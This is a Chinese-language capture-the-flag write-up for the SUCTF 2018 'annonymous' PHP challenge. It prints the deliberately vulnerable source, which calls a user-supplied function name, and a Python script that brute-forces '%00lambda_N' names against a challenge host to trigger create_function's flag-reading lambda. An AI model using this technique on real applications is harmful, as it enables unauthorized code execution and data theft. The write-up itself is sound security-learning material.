# \[SUCTF 2018]annonymous

## \[SUCTF 2018]annonymous

## 考点

* create\_function()生成的匿名函数是`%00lambda_[0-999]`

## wp

代码如下

```php
 <?php

$MY = create_function("","die(`cat flag.php`);");
$hash = bin2hex(openssl_random_pseudo_bytes(32));
eval("function SUCTF_$hash(){"
    ."global \$MY;"
    ."\$MY();"
    ."}");
if(isset($_GET['func_name'])){
    $_GET["func_name"]();
    die();
}
show_source(__FILE__); 
```

create\_function()这个函数在执行之后，会自动创建一个函数名为`%00lambda_[0-999]` 的函数

```python
import requests
import time
for i in range(0,1000):
    time.sleep(0.1)
    r=requests.get(url=f"http://ee04bc4a-bcac-4e6f-8fa8-e57bdec71e59.node4.buuoj.cn:81/?func_name=%00lambda_{str(i)}")
    if 'flag' in r.text:
        print(r.text)
```

## 小结

1. create\_function()生成的匿名函数是`%00lambda_[0-999]`
